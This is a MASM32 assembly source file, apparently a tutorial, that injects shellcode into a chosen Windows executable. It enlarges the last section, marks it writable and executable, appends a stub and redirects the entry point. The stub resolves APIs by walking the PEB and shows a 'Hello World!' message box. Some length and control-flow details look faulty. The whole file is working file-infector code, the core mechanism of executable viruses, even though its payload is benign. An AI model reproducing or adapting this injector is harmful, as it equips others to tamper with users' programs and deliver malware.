.386
.model flat, stdcall
option casemap : none
include masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\comdlg32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\comdlg32.lib

WinMain proto : DWORD, : DWORD, : DWORD, : DWORD
Injectcode proto : DWORD

SEH struct
PrevLink dd ?
CurrentHandler dd ?
SafeOffset dd ?
PrevEsp dd ?
PrevEbp dd ?
SEH ends

.data
AppName db "PE tutorial no.2", 0
ofn   OPENFILENAME <>
FilterString db "Executable Files (*.exe, *.dll)", 0, "*.exe;*.dll", 0
db "All Files", 0, "*.*", 0, 0
FileOpenError db "Cannot open the file for reading", 0
FileOpenMappingError db "Cannot open the file for memory mapping", 0
FileMappingError db "Cannot map the file into memory", 0
FileValidPE db "This file is a valid PE", 0
FileInValidPE db "This file is not a valid PE", 0
FileNamePattern db "*.*", 0
template db "é", 0
temp db "%s", 0
stt db "DONE!", 0
wp db "0x00", 0

.data ?
hInstance HINSTANCE ?
buffer db 512 dup(? )
hFile dd ?
hMapping dd ?
pMapping dd ?
ValidPE dd ?
numsec dd ?
filesize dd ?
newEOP dd ?
RVAnewEOP dd ?
sw dd ?
lenshell dd ?
jmp_shell dd ?
endShell dd ?
sub_len dd ?

.code
start proc
LOCAL seh : SEH
mov ofn.lStructSize, SIZEOF ofn
mov  ofn.lpstrFilter, OFFSET FilterString
mov  ofn.lpstrFile, OFFSET buffer
mov  ofn.nMaxFile, 512
mov  ofn.Flags, OFN_FILEMUSTEXIST or \
OFN_PATHMUSTEXIST or OFN_LONGNAMES or \
OFN_EXPLORER or OFN_HIDEREADONLY
invoke GetOpenFileName, addr ofn
.if eax == TRUE
invoke CreateFile, addr buffer, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
.if eax != INVALID_HANDLE_VALUE
mov hFile, eax
invoke CreateFileMapping, hFile, NULL, PAGE_READONLY, 0, 0, 0
.if eax != NULL
mov hMapping, eax
invoke MapViewOfFile, hMapping, FILE_MAP_READ, 0, 0, 0
.if eax != NULL
mov pMapping, eax
assume fs : nothing
push fs : [0]
pop seh.PrevLink
mov seh.CurrentHandler, offset SEHHandler
mov seh.SafeOffset, offset FinalExit
lea eax, seh
mov fs : [0], eax
mov seh.PrevEsp, esp
mov seh.PrevEbp, ebp
mov edi, pMapping
assume edi : ptr IMAGE_DOS_HEADER
.if[edi].e_magic == IMAGE_DOS_SIGNATURE
add edi, [edi].e_lfanew
assume edi : ptr IMAGE_NT_HEADERS
.if[edi].Signature == IMAGE_NT_SIGNATURE
mov ValidPE, TRUE
.else
mov ValidPE, FALSE
.endif
.else
mov ValidPE, FALSE
.endif
FinalExit :
.if ValidPE == TRUE
invoke Injectcode, addr buffer
.else
invoke MessageBox, 0, addr FileInValidPE, addr AppName, MB_OK + MB_ICONINFORMATION
.endif
push seh.PrevLink
pop fs : [0]
invoke UnmapViewOfFile, pMapping
.else
invoke MessageBox, 0, addr FileMappingError, addr AppName, MB_OK + MB_ICONERROR
.endif
invoke CloseHandle, hMapping
.else
invoke MessageBox, 0, addr FileOpenMappingError, addr AppName, MB_OK + MB_ICONERROR
.endif
invoke CloseHandle, hFile
.else
invoke MessageBox, 0, addr FileOpenError, addr AppName, MB_OK + MB_ICONERROR
.endif
.endif
invoke ExitProcess, 0
start endp

Injectcode proc uses edi filename : DWORD
LOCAL seh : SEH
LOCAL num : DWORD
jmp END_ADD
START_ADD :
assume fs : nothing
xor    ecx, ecx
mov    ecx, fs : [ecx + 30h]
mov    ecx, DWORD PTR[ecx + 0ch]
mov    ecx, DWORD PTR[ecx + 1ch]
g :
	mov    ebx, DWORD PTR[ecx + 8h]
	mov    eax, DWORD PTR[ecx + 20h]
	mov    ecx, DWORD PTR[ecx]
	cmp    BYTE PTR[eax + 0ch], 33h
	jne    g
	mov    ebp, ebx
	add    ebp, DWORD PTR[ebp + 3ch]
	mov    ebp, DWORD PTR[ebp + 78h]
	add    ebp, ebx
	mov    eax, DWORD PTR[ebp + 20h]
	add    eax, ebx
	xor    edx, edx
	k :
mov    esi, DWORD PTR[eax + edx * 4]
add    esi, ebx
inc    edx
cmp    DWORD PTR[esi], 50746547h
jne    k
cmp    DWORD PTR[esi + 4h], 41636f72h
jne    k
mov    esi, DWORD PTR[ebp + 24h]
add    esi, ebx
mov    dx, WORD PTR[esi + edx * 2]
mov    esi, DWORD PTR[ebp + 1ch]
add    esi, ebx
mov    esi, DWORD PTR[esi + edx * 4 - 4h]
add    esi, ebx
xor    edi, edi
push   edi
push   41797261h
push   7262694ch
push   64616f4ch
push   esp
push   ebx
call   esi
xor    ecx, ecx
push   edi
mov    cx, 3233h
push   ecx
push   72657375h
push   esp
call   eax
push   edi
push   141786fh
dec    BYTE PTR[esp + 3h]
push   42656761h
push   7373654dh
push   esp
push   eax
call   esi
push   edi
push   21646c72h
push   6f57206fh
push   6c6c6548h
mov    ecx, esp
push   edi
push   edi
push   ecx
push   edi
call   eax
push   edi
push   1737365h
dec    BYTE PTR[esp + 03h]
push	  636f7250h
push   74697845h
push   esp
push   ebx
call   esi
push   edi
popa
END_ADD :
invoke CloseHandle, hFile
invoke CreateFile, filename, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
.if eax != INVALID_HANDLE_VALUE
mov hFile, eax
invoke GetFileSize, hFile, NULL
mov filesize, eax
add eax, 100h
invoke CreateFileMapping, hFile, NULL, PAGE_READWRITE, 0, eax, 0
.if eax != NULL
mov hMapping, eax
mov eax, filesize
add eax, 100h
invoke MapViewOfFile, hMapping, FILE_MAP_WRITE or FILE_MAP_READ, 0, 0, eax
.if eax != NULL
mov pMapping, eax
assume fs : nothing
push fs : [0]
pop seh.PrevLink
mov seh.CurrentHandler, offset SEHHandler
mov seh.SafeOffset, offset FinalExit
lea eax, seh
mov fs : [0], eax
mov seh.PrevEsp, esp
mov seh.PrevEbp, ebp
mov edi, pMapping
assume edi : ptr IMAGE_DOS_HEADER
.if[edi].e_magic == IMAGE_DOS_SIGNATURE
add edi, [edi].e_lfanew
assume edi : ptr IMAGE_NT_HEADERS
.if[edi].Signature == IMAGE_NT_SIGNATURE
mov ValidPE, TRUE
.else
mov ValidPE, FALSE
.endif
.else
mov ValidPE, FALSE
.endif
FinalExit :
.if ValidPE == TRUE
mov ax, [edi].FileHeader.NumberOfSections
movzx eax, ax
dec eax
mov numsec, eax
mov esi, edi
add esi, sizeof IMAGE_NT_HEADERS
mov eax, sizeof IMAGE_SECTION_HEADER
mov ebx, numsec
mul ebx
add esi, eax
assume esi : ptr IMAGE_SECTION_HEADER
mov eax, [esi].PointerToRawData
add eax, [esi].SizeOfRawData
mov newEOP, eax
mov sw, eax
sub eax, [esi].PointerToRawData
add eax, [esi].VirtualAddress
mov RVAnewEOP, eax
mov eax, [esi].SizeOfRawData
add eax, 100h
mov[esi].SizeOfRawData, eax
mov[esi].Misc.VirtualSize, eax
mov[esi].Characteristics, 0E0000060h
mov eax, [esi].VirtualAddress
add eax, [esi].Misc.VirtualSize
mov[edi].OptionalHeader.SizeOfImage, eax
invoke SetFilePointer, hFile, sw, 0, 0
invoke WriteFile, hFile, addr wp, 100h, addr num, NULL
invoke SetFilePointer, hFile, newEOP, 0, 0
mov eax, offset END_ADD
mov ebx, offset START_ADD
sub eax, ebx
mov sub_len, eax
invoke WriteFile, hFile, offset START_ADD, offset sub_len, addr num, NULL
mov eax, offset END_ADD
sub eax, offset START_ADD
mov lenshell, eax
add eax, newEOP
mov endShell, eax
invoke SetFilePointer, hFile, eax, 0, 0
invoke WriteFile, hFile, addr template, 1, addr num, NULL
mov eax, endShell
inc eax
invoke SetFilePointer, hFile, eax, 0, 0
mov eax, [edi].OptionalHeader.AddressOfEntryPoint
sub eax, RVAnewEOP
sub eax, lenshell
sub eax, 5
mov jmp_shell, eax
invoke WriteFile, hFile, addr jmp_shell, 4, addr num, NULL
mov eax, RVAnewEOP
mov[edi].OptionalHeader.AddressOfEntryPoint, eax
invoke FlushViewOfFile, pMapping, 0
; invoke MessageBox, 0, addr stt, addr AppName, MB_OK
.else
ret
.endif
push seh.PrevLink
pop fs : [0]
invoke UnmapViewOfFile, pMapping
.else
ret
.endif
invoke CloseHandle, hMapping
.else
ret
.endif
invoke CloseHandle, hFile
.else
ret
.endif
ret
Injectcode endp

SEHHandler proc C uses edx pExcept : DWORD, pFrame : DWORD, pContext : DWORD, pDispatch : DWORD
mov edx, pFrame
assume edx : ptr SEH
mov eax, pContext
assume eax : ptr CONTEXT
push[edx].SafeOffset
pop[eax].regEip
push[edx].PrevEsp
pop[eax].regEsp
push[edx].PrevEbp
pop[eax].regEbp
mov ValidPE, FALSE
mov eax, ExceptionContinueExecution
ret
SEHHandler endp
end start